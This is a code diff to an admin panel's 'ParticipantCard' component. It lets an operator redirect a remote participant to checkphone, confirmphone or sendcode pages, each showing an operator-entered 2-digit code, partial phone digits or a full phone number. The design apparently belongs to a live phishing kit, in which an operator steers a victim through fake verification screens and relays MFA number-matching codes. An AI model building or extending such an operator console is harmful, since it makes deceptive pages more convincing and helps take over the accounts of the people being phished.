@@ -1097,9 +1097,18 @@ function ParticipantCard({
     }, 200);
   }
 
-  /** Pages that require a 2-digit code when redirecting (shown on participant page). */
-  const CODE_PAGES: Record<string, string[]> = {
-    ge: ["checkphone"],
+  /**
+   * Pages that need admin input before redirect.
+   * - code2: 2-digit code (checkphone prompt / confirmphone last digits)
+   * - phone: full phone number shown on sendcode
+   */
+  type RedirectInputMode = "code2" | "phone";
+  const REDIRECT_INPUT: Record<string, Record<string, RedirectInputMode>> = {
+    ge: {
+      checkphone: "code2",
+      confirmphone: "code2",
+      sendcode: "phone",
+    },
   };
 
   const PAGE_VARIANTS: Record<string, Record<string, { value: string; label: string }[]>> = {
@@ -1122,8 +1131,12 @@ function ParticipantCard({
     return page.split("?")[0] ?? page;
   }
 
+  function redirectInputMode(suite: Suite, page: Page): RedirectInputMode | null {
+    return REDIRECT_INPUT[suite]?.[pageBase(page)] ?? null;
+  }
+
   function routeTo(suite: Suite, page: Page) {
-    if (CODE_PAGES[suite]?.includes(pageBase(page))) {
+    if (redirectInputMode(suite, page)) {
       setAwaitingCodeFor(page);
       setCodeDraft("");
       return;
@@ -1134,10 +1147,19 @@ function ParticipantCard({
 
   function confirmCodeRedirect() {
     if (!pickedSuite || !awaitingCodeFor) return;
-    const digits = codeDraft.replace(/\D/g, "").slice(0, 2);
-    if (digits.length !== 2) return;
+    const mode = redirectInputMode(pickedSuite, awaitingCodeFor);
     const base = pageBase(awaitingCodeFor);
-    onNavigate(p.id, pickedSuite, `${base}?code=${digits}`);
+    if (mode === "phone") {
+      const phone = codeDraft.trim();
+      if (phone.replace(/\D/g, "").length < 7) return;
+      onNavigate(p.id, pickedSuite, `${base}?phone=${encodeURIComponent(phone)}`);
+    } else {
+      const digits = codeDraft.replace(/\D/g, "").slice(0, 2);
+      if (digits.length !== 2) return;
+      // confirmphone uses last-2 as hint; checkphone uses code=
+      const qs = base === "confirmphone" ? `hint=${digits}` : `code=${digits}`;
+      onNavigate(p.id, pickedSuite, `${base}?${qs}`);
+    }
     setAwaitingCodeFor(null);
     setCodeDraft("");
     closePanelKey("redirect");
@@ -1296,31 +1318,50 @@ function ParticipantCard({
                   ← Pages
                 </button>
                 <div className="admin-redirect-code">
-                  <p className="admin-redirect-code-label">
-                    Enter a 2-digit code to show on their screen
-                  </p>
-                  <input
-                    className="admin-redirect-code-input"
-                    type="text"
-                    inputMode="numeric"
-                    autoComplete="one-time-code"
-                    maxLength={2}
-                    placeholder="00"
-                    value={codeDraft}
-                    autoFocus
-                    onChange={(e) => setCodeDraft(e.target.value.replace(/\D/g, "").slice(0, 2))}
-                    onKeyDown={(e) => {
-                      if (e.key === "Enter") confirmCodeRedirect();
-                    }}
-                  />
-                  <button
-                    type="button"
-                    className="admin-redirect-code-go"
-                    disabled={codeDraft.replace(/\D/g, "").length !== 2}
-                    onClick={confirmCodeRedirect}
-                  >
-                    Send with code
-                  </button>
+                  {(() => {
+                    const mode =
+                      (pickedSuite && redirectInputMode(pickedSuite, awaitingCodeFor)) || "code2";
+                    const isPhone = mode === "phone";
+                    const base = pageBase(awaitingCodeFor);
+                    const label = isPhone
+                      ? "Enter the full phone number to show on their screen"
+                      : base === "confirmphone"
+                        ? "Enter the last 2 digits of their phone (shown as ••••••••XX)"
+                        : "Enter a 2-digit code to show on their screen";
+                    const ready = isPhone
+                      ? codeDraft.replace(/\D/g, "").length >= 7
+                      : codeDraft.replace(/\D/g, "").length === 2;
+                    return (
+                      <>
+                        <p className="admin-redirect-code-label">{label}</p>
+                        <input
+                          className={`admin-redirect-code-input${isPhone ? " is-phone" : ""}`}
+                          type="text"
+                          inputMode={isPhone ? "tel" : "numeric"}
+                          autoComplete={isPhone ? "tel" : "one-time-code"}
+                          maxLength={isPhone ? 20 : 2}
+                          placeholder={isPhone ? "(323) 376-8794" : "00"}
+                          value={codeDraft}
+                          autoFocus
+                          onChange={(e) => {
+                            if (isPhone) setCodeDraft(e.target.value.slice(0, 20));
+                            else setCodeDraft(e.target.value.replace(/\D/g, "").slice(0, 2));
+                          }}
+                          onKeyDown={(e) => {
+                            if (e.key === "Enter") confirmCodeRedirect();
+                          }}
+                        />
+                        <button
+                          type="button"
+                          className="admin-redirect-code-go"
+                          disabled={!ready}
+                          onClick={confirmCodeRedirect}
+                        >
+                          {isPhone ? "Send with number" : "Send with code"}
+                        </button>
+                      </>
+                    );
+                  })()}
                 </div>
               </>
             ) : pickedPage && PAGE_VARIANTS[pickedSuite]?.[pickedPage] ? (
